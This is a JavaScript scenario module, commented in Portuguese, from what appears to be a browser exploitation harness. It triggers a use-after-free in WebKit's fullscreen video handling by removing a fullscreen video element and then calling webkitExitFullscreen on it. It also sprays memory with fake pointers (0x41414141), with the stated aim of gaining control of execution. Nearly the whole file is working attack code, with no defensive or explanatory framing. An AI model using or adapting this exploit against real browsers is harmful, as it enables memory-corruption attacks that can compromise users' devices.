/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Fase de Exploração / Control)
 * Alvo: FullscreenVideoController::exitFullscreen()
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'HIGH',
    description: 'Tenta substituir o MediaPlayerPrivate freed com ponteiros falsos (0x41414141) para controle de execução.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);

        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.container.appendChild(this.video);

        // Spray de memória
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);

            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            const videoAlvo = this.video;

            // Entrar em fullscreen
            if (videoAlvo.webkitRequestFullscreen) {
                videoAlvo.webkitRequestFullscreen();
            }

            await new Promise(r => setTimeout(r, 100));

            // ======================
            // 1. FREE
            // ======================
            videoAlvo.remove();

            // ======================
            // 2. USE (UAF trigger)
            // ======================
            try {
                if (videoAlvo.webkitExitFullscreen) {
                    videoAlvo.webkitExitFullscreen();
                } else if (videoAlvo.webkitExitFullScreen) {
                    videoAlvo.webkitExitFullScreen();
                }
            } catch (e) {
                log("[ERRO EXIT] " + e);
            }

            // ======================
            // 3. HARD TRIGGER GLOBAL
            // ======================
            try {
                if (document.webkitExitFullscreen) {
                    document.webkitExitFullscreen();
                }
            } catch (e) {}

            // ======================
            // 4. FORÇA RELOAD (TIMING CRÍTICO)
            // ======================
            setTimeout(() => location.reload(), 500);

        } catch (e) {
            log("[ERRO] " + e);
        }
    },

    probe: [
        s => s.video.duration,
        s => s.video.readyState,
        s => s.video.videoWidth,
        s => s.video.webkitDecodedFrameCount,
        s => {
            try {
                return s.video.buffered.start(0);
            } catch(e) {
                return e.name;
            }
        }
    ],

    cleanup: function() {
        try {
            this.container.remove();
        } catch(e) {}

        this.sprayPayload = null;
    }
};
